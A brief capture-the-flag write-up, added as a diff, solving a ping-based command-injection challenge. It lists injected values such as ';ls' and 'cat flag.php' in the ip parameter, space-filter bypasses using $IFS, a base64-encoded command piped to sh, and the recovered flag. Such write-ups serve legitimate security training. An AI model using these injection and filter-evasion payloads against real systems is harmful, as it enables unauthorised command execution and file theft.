@@ -1,0 +1,31 @@
+guess excute command
+
+first test input
+/?ip=www.baidu.com;ls
+
+output
+/?ip=
+PING www.baidu.com (14.215.177.39): 56 data bytes
+flag.php
+index.php
+
+input
+/?ip=www.baidu.com; cat flag.php
+
+output
+/?ip= fxck your space!
+
+Bypassing Spaces
+using $IFS$1
+
+base64
+echo$IFS$1Y2F0JElGUyQ5ZmxhZy5waHA=|base64$IFS$1-d|sh
+or
+b=ag;cat$IFS$9fl$b.php
+
+see the html source
+/?ip=
+<pre>PING 1 (0.0.0.1): 56 data bytes
+<?php
+$flag = "flag{0e458d4a-bcba-4685-8804-2202ebb8f47f}";
+?>
